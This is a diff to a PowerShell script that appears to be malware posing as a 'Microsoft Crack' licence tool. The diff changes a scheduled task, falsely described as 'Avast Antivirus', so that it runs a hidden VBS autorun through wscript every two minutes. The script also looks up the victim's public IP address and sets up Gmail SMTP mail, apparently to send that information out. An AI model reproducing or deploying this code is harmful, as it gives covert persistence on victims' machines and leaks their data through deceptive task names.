@@ -31,11 +31,11 @@ if(!(Test-Path "$location\Microsoft\count.txt")) {
 
 
      try { 
-	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR "C:\Users\Public\Licence\Licence-main\Microsoft.bat" /ST 00:00 /RI 2 /DU 24:00 | Out-Null
+	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR 'wscript.exe ""C:\Users\Public\Licence\Licence-main\Autorun.vbs""' /ST 00:00 /RI 2 /DU 24:00 | Out-Null
      }
      catch { 
 	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("2")) -RepeatIndefinitely
-            $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Licence-main\Microsoft.bat"
+            $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\Public\Licence\Licence-main\Autorun.vbs"'
             Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft Crack" -Description "Avast Antivirus" -Force		
 	   }
   	
@@ -72,7 +72,6 @@ else{
     Start-Sleep -Milliseconds 80  
     $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
   
-#----------------------------------------------------------------Email------------------------------------------------------------------------------#
 
     $smtpserver = "smtp.gmail.com"
     $msg = new-object Net.Mail.MailMessage
